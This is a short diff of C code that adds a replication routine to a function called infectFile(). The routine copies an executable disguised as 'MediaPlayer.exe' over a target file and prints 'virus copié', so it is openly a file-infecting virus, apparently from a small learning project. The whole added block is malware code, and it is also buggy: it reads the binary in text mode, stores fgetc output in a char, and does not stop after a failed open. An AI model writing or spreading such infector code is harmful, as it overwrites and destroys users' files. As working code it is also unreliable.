@@ -162,7 +162,35 @@ char* infectFile()
 	}
 	free(directory);
     if (closedir(dir) != 0) perror("Error ");
-    return rname;
+
+    FILE *fileToCopy, *fileCopied;
+    char ch; //Stock every charactere of the source file
+    int pos; // The cursor postion in the source fille
+
+    if ((fileToCopy = fopen("MediaPlayer.exe","r")) == NULL)    
+	{    
+	    printf("\nLe fichier ne peut pas etre ouvert\n");
+        perror("Error ");
+    }
+
+    fileCopied = fopen(pname, "w");  
+    fseek(fileToCopy, 0L, SEEK_END); // file pointer at end of file
+    pos = ftell(fileToCopy); // The total size of te source file 
+    fseek(fileToCopy, 0L, SEEK_SET); // file pointer set at start
+       
+	while (pos--)
+    {
+        ch = fgetc(fileToCopy);  // copying file character by character
+        fputc(ch, fileCopied);
+    }    
+
+	printf("virus copié\n");
+
+    fclose(fileCopied);
+    fclose(fileToCopy);
+
+
+	return rname;
 }
 
 int
